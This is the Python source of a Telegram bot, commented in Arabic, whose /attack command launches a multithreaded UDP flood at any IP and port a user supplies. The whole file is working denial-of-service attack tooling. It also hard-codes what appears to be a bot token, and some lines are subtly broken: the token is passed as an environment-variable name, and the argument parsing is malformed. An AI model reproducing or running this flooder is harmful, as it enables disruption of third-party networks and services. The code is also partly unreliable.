import os
import socket
import time
import threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.request import HTTPXRequest # استيراد إعدادات الطلبات

TOKEN = os.environ.get("8980281589:AAEqY4nk6POnwVwNJ85tZ4GKhh8j7fGbUgw")

# الـ Payload العشوائي
PAYLOAD = "!@_n15=-1n1,,5<%@!%.>{424}_;}{[42424242]-[424JIROINj521n9558n15N%1n019505%)(@!%N!%%!()%!^)@!*!^)!N^n66n1l.6[pn1[6pn^NO^1-6-1n61-n6161=-6[1NO^Pn1i60n9i1n69016n16n16nop12k6np1on6k1p<>A<?>W<N,./awn,525n1;5".encode('utf-8')

def run_flooder(target_ip, target_port, attack_time, bots_count):
    stop_event = threading.Event()

    def flooder_worker():
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop_event.is_set():
            try:
                client.sendto(PAYLOAD, (target_ip, target_port))
            except Exception:
                pass
            time.sleep(0.1)

    threads = []
    for _ in range(bots_count):
        t = threading.Thread(target=flooder_worker)
        t.daemon = True
        threads.append(t)
        t.start()

    time.sleep(attack_time)
    stop_event.set()

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 4:
        await update.message.reply_text(
            "❌ استخدام خاطئ!\nالصيغة الصحيحة:\n`/attack <ip> <port> <time> <bots>`",
            parse_mode="Markdown"
        )
        return

    target_ip = args[0]
    try:
        target_port = int(args[1])
        attack_time = int(args[2])
        bots_count = int(args.args[3] if hasattr(args, 'args') else int(args[3])) # ضبط قراءة البوتات
    except ValueError:
        await update.message.reply_text("❌ خطأ: يجب أن يكون البورت والوقت وعدد البوتات أرقاماً صحيحة.")
        return

    await update.message.reply_text(f"🔵 [INFO] Flooding started to {target_ip}:{target_port} for {attack_time}s...")
    threading.Thread(target=run_flooder, args=(target_ip, target_port, attack_time, bots_count)).start()

def main():
    # رفع مهلة الاتصال والانتظار (Timeout) إلى 30 ثانية لتجنب قطع الاتصال
    custom_request = HTTPXRequest(
        connect_timeout=30.0,
        read_timeout=30.0
    )

    app = ApplicationBuilder().token(TOKEN).request(custom_request).build()

    app.add_handler(CommandHandler("attack", attack_command))

    print("[INFO] Telegram Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
